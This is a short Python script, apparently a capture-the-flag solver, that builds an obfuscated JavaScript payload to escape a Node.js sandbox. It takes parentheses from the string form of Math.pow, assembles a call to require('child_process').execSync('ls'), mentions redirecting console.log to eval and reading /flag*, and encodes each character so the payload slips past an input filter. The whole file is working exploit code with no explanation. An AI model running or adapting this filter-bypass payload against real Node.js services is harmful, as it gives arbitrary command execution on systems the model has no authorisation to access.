S = """
x = '';
x = x + Math.pow;
y = x [6 + 6];
z = x [6 + 7];

'require' + y + 'child_process' + z + '.execSync' + y + 'ls' + z
"""

"""
console.log = eval;
require('child_process').execSync('ls')
"""

S = S.replace("\n", "")
print(S)

# S = """eval \\u0028 \\u0029 console.log = ; cat /flag*"""

ans = """b = " " ;"""
for s in S:
    x = f"""a = " {s} ";  a[ 1 ]; b += a [1] ; """
    ans += x

ans += " b ; "
print(ans)
